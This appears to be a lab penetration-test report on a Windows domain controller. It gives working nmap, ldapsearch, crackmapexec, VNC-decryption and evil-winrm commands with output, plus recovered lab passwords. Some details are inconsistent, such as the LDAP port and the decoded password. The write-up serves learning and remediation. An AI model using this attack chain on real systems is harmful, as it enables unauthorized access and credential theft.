Table of Contents
***
**Executive Summary**
	Summary of results
**Attack Path**
	LDAP discovery and enumeration
	Authenticated SMB enumeration
	Lateral movement to interactive shell
	Administrative Privilege Escalation
	Escalation to Domain Administrator
**Conclusion**
	Recommendation
	Risk Rating
**Appendix: Vulnerability Detail and Mitigation**
	Unauthenticated LDAP enumeration
	Password attributes field in LDAP
	User Access control
	Weak/Static Key Encryption
	Password Reuse
***

# Executive Summary
***
### Summary of results


# Attack Path
***
## LDAP discovery and enumeration
Scanned the IP with nmap and discovered 13 open TCP ports. The automated scripts revealed the hostname of cascade.local.

Time ran: Fri Oct 28 23:31:06 2022
```bash
nmap 10.10.10.182 -sC -sV
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-28 12:31:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```
With LDAP open on port 2368 we checked if we could query LDAP.
```bash
ldapsearch -x -H ldap://10.10.10.182 -s base namingcontexts

Domain DC=cascade,DC=local
```
Proceeded to enumerate LDAP and gather usernames.
```bash
ldapsearch -x -H ldap://10.10.10.182 -s sub -b 'DC=cascade,DC=local' > ldap_anon

cat ldap_anon | grep sAMAccountName | awk -F": " '{print $2}' > usernames.ldap
```

Usernames.ldap
```txt
s.smith
r.thompson
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
j.allen
i.croft
```

Checked for any passwords stored within ldap by looking for unique values.
```bash
cat ldap_anon | sort | uniq -c | sort -nr
```

This revealed a cascadeLegacyPwd from r.thompson's user object
```base64
clk0bjVldmE=
```
Which when decoded is
```txt
rY4n53va
```

## Authenticated SMB enumeration
***
Listed all the files that r.thompson can view within smb
```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva -M spider_plus
```
This user can view a vnc install.reg file within another user's folder.

## Lateral movement to interactive shell
***
When viewing the file there is an encrypted password.
```bash
cat VNC\ Install.reg 
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""

"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```
Decrypting with the static key.
```ruby
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"  
require 'rex/proto/rfb'  
Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
```

Plain text password of sT333ve2
Logging in with evil-winrm provides an interactive shell.

```bash
evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
```

## Administrative Privilege Escalation
***
We enumerated smb again with the new credentials and found a Audit$ drive, which has an executable. Reverse engineering the executable reveals the password `W3lc0meFr31nd` for the ArkSvc user which has administrator privileges.

## Escalation to Domain Administrator
***
The ArkSvc user is a member of the recycle bin group which can read files that have been deleted.

```powershell
Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter
{ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
```
There is a file that contains the password for tempadmin which is also the default admin password for the domain.
```
baCT3r1aN00dles
```

We then proceeded to login as the administrator account with winrm, which results in domain admin.

# Conclusion
***

## Recommendations
***
- Do not reuse passwords for admin accounts.
- Remove the cascadeLegacyPwd field from r.thompson and tempadmin from their AD objects
- Use a better vnc type as this one has a static password, so the encryption is useless.
- Do not have hard coded credentials for an encryption algorithm (Audit.exe)
- Why does s.smith need to be able to view the database?
- Have a stronger password policy and have rotations every 30 days.
- Disable winrm on all accounts that do not need it.

## Risk Rating
***
Overall there is a **high** risk identified from this report. There is a direct path for an external attacker to have full system compromise. There is very realistic that an malicious entity would be able to execute this attack through this attack chain. 